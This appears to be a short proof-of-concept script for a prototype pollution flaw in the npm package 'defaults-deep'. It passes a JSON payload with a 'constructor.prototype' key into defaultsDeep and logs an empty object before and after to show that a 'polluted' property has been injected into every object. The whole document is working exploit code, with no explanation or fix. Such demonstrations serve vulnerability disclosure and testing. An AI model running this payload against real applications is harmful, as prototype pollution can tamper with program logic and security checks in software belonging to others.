const defaultsDeep = require('defaults-deep');
console.log({}.polluted);
let malicious_payload = '{"constructor.prototype": {"polluted":"yes"}}';
defaultsDeep({}, JSON.parse(malicious_payload));
console.log({}.polluted);